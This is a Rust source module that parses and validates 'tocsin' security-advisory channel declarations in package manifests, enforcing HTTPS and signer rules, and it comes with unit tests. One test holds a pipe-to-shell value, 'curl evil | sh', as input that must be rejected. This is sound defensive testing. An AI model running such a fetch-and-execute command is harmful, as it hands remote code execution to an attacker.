//! Channel declarations (spec section 5).

use crate::SPEC_VERSION;
use serde::{Deserialize, Serialize};
use std::fmt;

/// The `tocsin` object a component embeds in its manifest.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Declaration {
    pub spec: String,
    pub feed: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub push: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub signer: Option<Signer>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub contact: Option<String>,
}

/// Expected identity of the advisory signer (Sigstore keyless signing).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Signer {
    pub issuer: String,
    pub identity: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Problem {
    UnsupportedSpec(String),
    NotHttps { field: &'static str, value: String },
    InvalidUrl { field: &'static str, value: String },
    EmptyField(&'static str),
}

impl fmt::Display for Problem {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Problem::UnsupportedSpec(v) => {
                write!(
                    f,
                    "unsupported spec version `{v}` (this agent implements {SPEC_VERSION})"
                )
            }
            Problem::NotHttps { field, value } => write!(f, "`{field}` must use HTTPS: `{value}`"),
            Problem::InvalidUrl { field, value } => {
                write!(f, "`{field}` is not a valid URL: `{value}`")
            }
            Problem::EmptyField(field) => write!(f, "`{field}` must not be empty"),
        }
    }
}

#[derive(Debug, thiserror::Error)]
pub enum DeclarationError {
    #[error("invalid JSON: {0}")]
    Json(#[from] serde_json::Error),
    #[error("invalid TOML: {0}")]
    Toml(#[from] toml::de::Error),
    #[error("no `tocsin` declaration found in this manifest")]
    NotFound,
    #[error("invalid declaration: {}", .0.iter().map(ToString::to_string).collect::<Vec<_>>().join("; "))]
    Invalid(Vec<Problem>),
}

fn check_https(field: &'static str, value: &str, problems: &mut Vec<Problem>) {
    match url::Url::parse(value) {
        Ok(url) if url.scheme() == "https" && url.host().is_some() => {}
        Ok(_) => problems.push(Problem::NotHttps {
            field,
            value: value.to_owned(),
        }),
        Err(_) => problems.push(Problem::InvalidUrl {
            field,
            value: value.to_owned(),
        }),
    }
}

impl Declaration {
    /// Checks the rules of spec section 5.
    pub fn validate(&self) -> Result<(), DeclarationError> {
        let mut problems = Vec::new();
        if self.spec != SPEC_VERSION {
            problems.push(Problem::UnsupportedSpec(self.spec.clone()));
        }
        check_https("feed", &self.feed, &mut problems);
        if let Some(push) = &self.push {
            check_https("push", push, &mut problems);
        }
        if let Some(signer) = &self.signer {
            check_https("signer.issuer", &signer.issuer, &mut problems);
            if signer.identity.trim().is_empty() {
                problems.push(Problem::EmptyField("signer.identity"));
            }
        }
        if problems.is_empty() {
            Ok(())
        } else {
            Err(DeclarationError::Invalid(problems))
        }
    }

    /// Without a declared signer, no advisory of this channel may trigger an
    /// automatic action (spec section 5.1).
    pub fn allows_automatic_actions(&self) -> bool {
        self.signer.is_some()
    }

    /// Reads a JSON manifest (`package.json`, `tocsin.json`…). The declaration
    /// may be the whole document or its `tocsin` field.
    pub fn from_json_manifest(input: &str) -> Result<Self, DeclarationError> {
        let value: serde_json::Value = serde_json::from_str(input)?;
        let object = value.get("tocsin").cloned().unwrap_or(value);
        if !object.is_object() || object.get("feed").is_none() {
            return Err(DeclarationError::NotFound);
        }
        let declaration: Declaration = serde_json::from_value(object)?;
        declaration.validate()?;
        Ok(declaration)
    }

    /// Reads `[package.metadata.tocsin]` from a `Cargo.toml`.
    pub fn from_cargo_toml(input: &str) -> Result<Self, DeclarationError> {
        Self::from_toml_path(input, &["package", "metadata", "tocsin"])
    }

    /// Reads `[tool.tocsin]` from a `pyproject.toml`.
    pub fn from_pyproject_toml(input: &str) -> Result<Self, DeclarationError> {
        Self::from_toml_path(input, &["tool", "tocsin"])
    }

    fn from_toml_path(input: &str, path: &[&str]) -> Result<Self, DeclarationError> {
        let mut value: toml::Value = toml::from_str(input)?;
        for key in path {
            value = value.get(*key).cloned().ok_or(DeclarationError::NotFound)?;
        }
        let declaration: Declaration = value.try_into()?;
        declaration.validate()?;
        Ok(declaration)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const VALID: &str = r#"{"name":"w","tocsin":{"spec":"0.1","feed":"https://example.org/feed.json",
        "signer":{"issuer":"https://token.actions.githubusercontent.com","identity":"https://github.com/e/w"}}}"#;

    #[test]
    fn reads_package_json_field() {
        let d = Declaration::from_json_manifest(VALID).unwrap();
        assert_eq!(d.feed, "https://example.org/feed.json");
        assert!(d.allows_automatic_actions());
    }

    #[test]
    fn reads_bare_declaration() {
        let d = Declaration::from_json_manifest(r#"{"spec":"0.1","feed":"https://example.org/f"}"#)
            .unwrap();
        assert!(!d.allows_automatic_actions());
    }

    #[test]
    fn rejects_plain_http_and_unknown_spec() {
        let err = Declaration::from_json_manifest(
            r#"{"spec":"9.9","feed":"http://example.org/f","push":"not a url"}"#,
        )
        .unwrap_err();
        let DeclarationError::Invalid(problems) = err else {
            panic!("expected Invalid, got {err:?}")
        };
        assert_eq!(problems.len(), 3);
        assert!(matches!(problems[0], Problem::UnsupportedSpec(_)));
        assert!(matches!(
            problems[1],
            Problem::NotHttps { field: "feed", .. }
        ));
        assert!(matches!(
            problems[2],
            Problem::InvalidUrl { field: "push", .. }
        ));
    }

    #[test]
    fn rejects_unknown_fields() {
        // A declaration says where to listen, never what to run (spec 5.4).
        let err = Declaration::from_json_manifest(
            r#"{"spec":"0.1","feed":"https://example.org/f","run":"curl evil | sh"}"#,
        );
        assert!(matches!(err, Err(DeclarationError::Json(_))));
    }

    #[test]
    fn missing_declaration() {
        let err = Declaration::from_json_manifest(r#"{"name":"w","version":"1.0.0"}"#);
        assert!(matches!(err, Err(DeclarationError::NotFound)));
    }

    #[test]
    fn reads_cargo_and_pyproject() {
        let cargo = "[package]\nname = \"w\"\n[package.metadata.tocsin]\nspec = \"0.1\"\nfeed = \"https://example.org/f\"\n";
        assert!(Declaration::from_cargo_toml(cargo).is_ok());
        let py = "[project]\nname = \"w\"\n[tool.tocsin]\nspec = \"0.1\"\nfeed = \"https://example.org/f\"\n";
        assert!(Declaration::from_pyproject_toml(py).is_ok());
        assert!(matches!(
            Declaration::from_pyproject_toml("[project]\nname = \"w\"\n"),
            Err(DeclarationError::NotFound)
        ));
    }
}
